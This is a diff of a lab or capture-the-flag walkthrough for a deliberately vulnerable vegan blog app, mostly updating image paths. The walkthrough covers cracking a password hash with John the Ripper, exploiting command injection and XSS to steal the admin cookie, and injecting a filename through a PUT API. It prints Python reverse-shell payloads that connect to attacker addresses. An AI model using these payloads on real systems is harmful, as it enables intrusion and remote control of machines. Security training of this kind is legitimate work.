@@ -95,7 +95,7 @@ We have to download the backup and read the clear-text credentials from it to lo
 
 As previously said, VC0RP runs a popular blog, "The Green Crusaders", which can be accessed at `/blog` 
 
-![The Green Crusaders Blog](medium1.jpg)
+![The Green Crusaders Blog](images/tgc/blog.png)
 
 The blog will contain articles centered around veganism and such. We can see that there are two main authors:
 Fabiola di Sotto
@@ -106,7 +106,7 @@ Let’s inform ourselves about veganism a little more by checking any blog post,
 ```
 Which will look like so:
 
-![A page from The Green Crusaders Blog](medium2.jpg)
+![A page from The Green Crusaders Blog](images/tgc/article.png)
 
 Let’s click onto the name of the author itself, which will lead to the following page:
 ```sh
@@ -141,7 +141,7 @@ Now we check which kind of algorithm output the above hash, which can be done wi
 $ hash-analyzer 78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46
 ```
 We will get told that the most probable candidate is SHA256, which is pretty secure… right?
-![Hash analyzer](medium3.jpg)
+![Hash analyzer](images/tgc/medium/kali_hash_identifier.png)
 
 You never know until you try it, we can try to crack it by using any password cracking tool like **JohnTheRipper** or **hashcat**, in this case we will use the Ripper, while using the `rockyou` wordlist:
 ```sh
@@ -150,7 +150,7 @@ $ john --wordlist=/usr/share/wordlists/rockyou.txt.gz crack.txt
 ```
 Bingo!
 
-![Successful password crack](medium4.jpg)
+![Successful password crack](images/tgc/medium/kali_hash_decode.png)
 
 We can now try logging in using the just cracked password and the above login:
 ```
@@ -164,7 +164,7 @@ Note: the same could be done with blog author ‘Fabiola di Sotto’, whose user
 ### Exploit
 Once entered as author of the blog, from the bottom of the profile page of the user we can access the `/YWRtaW4K/dashboard` which displays info on the posts of the user. 
 
-![Author’s dashboard](medium5.jpg)
+![Author’s dashboard](images/tgc/medium/user_dashboard.png)
 
 From the site’s dashboard on the right, the author can search for the active users of the blog, which seems legit… or is it?
 
@@ -174,23 +174,23 @@ Not at all: the search form is vulnerable to `command injection`, which we can e
 ```
 There seems not to be any kind of filtering applied to it, after all, we are trusted authors! 
 
-![User search command injection](medium6.jpg)
+![User search command injection](images/tgc/medium/user_dashboard_command_injection.png)
 
 Therefore, we get a reverse shell from it by injecting the following bash command
 ```sh
-"; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.1.80",9321));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' # 
+"; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("your.attacker.ip.address",attacker_port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' # 
 ```
 ## 🔴 Hard path
 To exploit the hard path we have to take the same steps of the medium path, so we have to be logged in as an author of the blog (any). As an author of the blog, we can publish posts from the `/YWRtaW4K/new-article` page
 
-![Publishing new posts](medium7.jpg)
+![Publishing new posts](images/tgc/medium/new_article.png)
 
 However, we don’t have complete control over what we post, as upon pressing ‘post article’, our post will have to be checked by an administrator for approval… boring!
 
-![Publishing new posts](medium8.jpg)
+![Publishing new posts](images/tgc/medium/article_processing.png)
 
 After a painful wait, we will have our post published. Hooray…? Indeed, because when it comes to posts and possible vulnerabilities, the first one that will come into our mind is cross site scripting.
-
+![New post is submitted](images/tgc/medium/article_submitted.png)
 ### Exploit
 
 The post submission process does not check and validate user input automatically so cross site scripting is possible which we can double check that by posting a post with the following input
@@ -211,32 +211,44 @@ Let's wait for the “admin” to check our post. When he opens our post he will
 ::ffff:127.0.0.1 - - [23/Apr/2024 19:19:05] "GET /?userData=fc7fcd0dfff43f12ea176c886e9a6e98d2dc4645bc09f009bfcc78390947eb6c641dace3d9a2c6d9539b75ff2a9cb809f8a493e88a9a45b62ac52179a6b323c789c8fde69a7bea3c4ede6aeb71fa183f3ff0e5ef78d45f68c2b1dfcd2d0e7602f23c7990c61a5d1e6ac7da58383a1292d025411d159f89e28e64845f1c4bc64d5d9a0ee6dc44e267d0ae1e87d751506e8489c8ae420563bcf451fb52ebc99805 HTTP/1.1" 200 -
 ::ffff:127.0.0.1 - - [23/Apr/2024 19:19:35] "GET /?userData=71c2e52a10d556e4a059a0dbfb8052db01e6c6dbff383879211163d6a748da4dddcb4a39ceb761cd05402fefa6d71ec5fc2ad619da1097599b946b172b023854288cb087e15e2ecd1c8ec41e0437a4c037e4edb3e1085ba9c97efc35c4c09afc4ae64fd0fbd3a93f0435871fce25cc1ef3a1db3ec484eaafed077fe59e3d268e470d8bd38f495f73cc5db152701e2242a94bd8e55e08535ec1654510f00f5644b8717c9c811f0f280604d1b15f9dd4b4 HTTP/1.1" 200 -
 ```
+![](images/tgc/medium/dump_admin_cookie_2.png)
 
 Now that we have the admin cookie in our hands, we can now login as the admin!
 
-We are now admin and we can access the admin panel. From here it seems we can organize a vegan protest. The form to submit the protests asks for an image of it. 
+After we logged in as the admin we can access the admin panel. 
+![organize a protest](images/tgc/hard/admin_landing.png)
 
-![organize a protest](hard1.jpg)
+From here we can organize a vegan protest. The form to submit a protest asks for an image of the protest. 
 
-The file uploaded is checked for it to be an image. This check is done by an API that checks the filename of the image using a bash script. If we interrogate this API with the OPTIONS method of HTTP we discover the methods accepted by the API:
+![organize a protest](images/tgc/hard/admin_protest.png)
+If we submit a valid (or invalid) flyer for the protest, we will obtain a badge that notify for a legit or non legit image.
 
-![burp options response](hard2.jpg)
+![organize a protest](images/tgc/hard/admin_image_upload.png)
+
+The file uploaded is checked for it to be an image. This check is done by an API that checks the filename of the image using a bash script. 
+
+![organize a protest](images/tgc/hard/admin_api_analyze.png)
+
+If we interrogate this API with the OPTIONS method of HTTP we discover the methods accepted by the API:
+
+![burp options response](images/tgc/hard/admin_api_analysis.png)
 
 This API is under development and the developers are experimenting with some HTTP methods. Indeed if we send the image to the API with a POST 
 request the check is done correctly and the filename is sanitized. 
 
-![POST API check](hard3.jpg)
+![POST API check](images/tgc/hard/admin_api_analysis.png)
 
 However the developers are currently implementing a new and more robust check and they are testing it using the PUT method, so that the current POST method check remains usable.
 
-![PUT API check](hard4.jpg)
+![PUT API check](images/tgc/hard/admin_api_analysis_2.png)
 
 If we submit the file to the API but with a PUT request the API will not sanitize the filename and this will lead to remote command execution!
 If we inject the following payload
 ```sh
-"; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.1.80",9321));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' # 
+{"filename":"\"; python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"192.168.1.142\",9321));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")' #"}
+
 ```
-![Burpsuite filename payload](hard5.jpg)
+![Burpsuite filename payload](images/tgc/hard/admin_api_exploit.png)
  
 # Privilege escalation
 Once remote access has been obtained, the penetration tester can look to escalate privileges in order to completely exploit the machine and gather all kinds of information they were not supposed to.
